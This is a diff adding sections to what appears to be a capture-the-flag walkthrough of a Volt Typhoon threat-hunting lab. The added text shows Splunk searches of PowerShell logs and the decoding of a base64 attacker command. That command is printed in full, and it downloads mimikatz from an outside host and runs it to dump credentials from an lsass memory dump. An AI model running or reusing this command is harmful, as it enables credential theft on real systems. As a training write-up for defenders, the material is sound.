@@ -284,6 +284,63 @@ We can clearly see they are trying to find the keyword Virtual to assess if they
 
 <img width="1342" height="455" alt="image" src="https://github.com/user-attachments/assets/f4bda555-e186-4acd-b203-0ecff52a4380" />
 
+Here we are introduced to another one of Volt Typhoons tactics, since we are already given the powershell command used we should filter for it and see what is available we use this filter:
+
+**index="main" sourcetype=powershell CommandLine="reg"**  and we find 8 events, this should be easy to sort through.
+
+
+Within these events we see the three applications they quaery 
+
+
+<img width="1136" height="853" alt="image" src="https://github.com/user-attachments/assets/489054e0-3283-489f-be5c-83550f71b720" />
+
+<img width="1606" height="866" alt="image" src="https://github.com/user-attachments/assets/566e065d-174d-4c4e-9503-a1cbff5eb018" />
+
+
+
+**OpenSSH, Putty, and realVNC.**
+
+
+
+
+
+**What is the full decoded command the attacker uses to download and run mimikatz?**
+
+Mimikatz is a popular tool for password/hash dumping on windows and is commonly used by pentesters and threat actors alike.
+
+It is important to realize here that they want us to **decode** the command, meaning command itself will be **encoded** so we cannot just search for the string 'mimikatz' and easily find what we are looking for. this APT Tends to use powershell so lets keep our source log on powershell.
+
+Since we know it is a download however, we should try commands with PS that do Downloads
+
+<img width="1894" height="668" alt="image" src="https://github.com/user-attachments/assets/68aecf5e-0ea7-47bb-87cb-e739916bd4d6" />
+
+
+We don't find anything of substance meaning the cmdlet itself might actually be encoded.
+
+After running through all of the CMDLETs one looks like it could be revelant: the **"-exec" cmdlet**, since the command is also running mimikatz it makes sense this could be relevant, lets set this as our filter
+
+
+<img width="1917" height="840" alt="image" src="https://github.com/user-attachments/assets/2734b3e6-00a2-426b-a2f4-94736e06a3ce" />
+
+
+We now have found an extremely suspicious PS command, lets decode it with the base64 decode tool we used earlier:
+
+
+<img width="988" height="471" alt="image" src="https://github.com/user-attachments/assets/2f6e98ff-7477-499d-9b3b-a42767d547ba" />
+
+And we have found the malicous command and the Invoke Web Request cmdlet we were expecting earlier:
+
+**Invoke-WebRequest -Uri "http://voltyp.com/3/tlz/mimikatz.exe" -OutFile "C:\Temp\db2\mimikatz.exe"; Start-Process -FilePath "C:\Temp\db2\mimikatz.exe" -ArgumentList @("sekurlsa::minidump lsass.dmp", "exit") -NoNewWindow -Wait****
+
+
+
+**Discovery and Lateral Movement:**
+
+<img width="1271" height="559" alt="image" src="https://github.com/user-attachments/assets/92a233e9-8c8d-48b1-943a-a9ae8f4b9b5f" />
+
+
+
+
 
 
 
